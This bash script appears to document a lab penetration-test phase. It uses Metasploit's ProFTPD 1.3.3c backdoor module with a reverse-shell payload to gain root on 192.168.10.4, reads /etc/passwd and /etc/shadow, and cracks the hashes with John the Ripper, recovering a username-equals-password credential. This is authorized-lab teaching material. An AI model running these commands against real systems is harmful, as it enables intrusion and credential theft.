#!/usr/bin/env bash
# =============================================================================
# Phase 4 – Authentication Strength Evaluation
# =============================================================================
# Goal: Gain root access via the ProFTPD 1.3.3c backdoor, extract password
#       hashes from /etc/passwd and /etc/shadow, and crack them offline to
#       evaluate password strength.
#
# Tools required: metasploit-framework (msfconsole), john (John the Ripper)
#
# WARNING: These commands involve active exploitation of a vulnerable system.
#          Run ONLY in an isolated, authorized lab environment.
#          Do NOT execute against any system without explicit written permission.
# =============================================================================

# -----------------------------------------------------------------------------
# Part A – Gaining Root Access via Metasploit (ProFTPD 1.3.3c backdoor)
#
# Run the following commands interactively inside msfconsole.
# This script documents the sequence; it cannot be run as a fully automated
# bash script because msfconsole requires an interactive session.
# -----------------------------------------------------------------------------

# Launch Metasploit console
msfconsole

# --- Inside msfconsole ---
# Search for the ProFTPD exploit module
# > search proftpd

# Load the backdoor exploit
# > use exploit/unix/ftp/proftpd_133c_backdoor

# Review required options
# > show options

# Set the target IP
# > set RHOSTS 192.168.10.4

# Select a reverse shell payload
# > set payload cmd/unix/reverse

# Set the Kali Linux IP as the listener
# > set LHOST 192.168.10.3

# Execute the exploit – opens a root shell on the target
# > run

# Verify root access on the opened shell
# > whoami

# Read the account file (UID/GID/home/shell info)
# > cat /etc/passwd

# Read the hashed password file (requires root)
# > cat /etc/shadow

# -----------------------------------------------------------------------------
# Part B – Transferring Files to Kali and Cracking Passwords (run on Kali)
#
# After reading /etc/passwd and /etc/shadow contents from the target shell,
# manually save each to a local file on Kali using a text editor.
# -----------------------------------------------------------------------------

# Save the /etc/passwd output to a local file
nano passwd

# Save the /etc/shadow output to a local file
nano shadow

# -----------------------------------------------------------------------------
# Part C – Offline Password Cracking with John the Ripper
# -----------------------------------------------------------------------------

# Combine passwd and shadow into a single crackable file
unshadow passwd shadow > crackme.txt

# Attempt a wordlist attack using the rockyou wordlist (did not recover the password)
john --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt

# Attempt single-crack mode (tests username as password – immediately successful)
john --single crackme.txt

# Display all recovered credentials
john --show crackme.txt

# Result: marlinspike : marlinspike  (password equals username – cracked instantly)
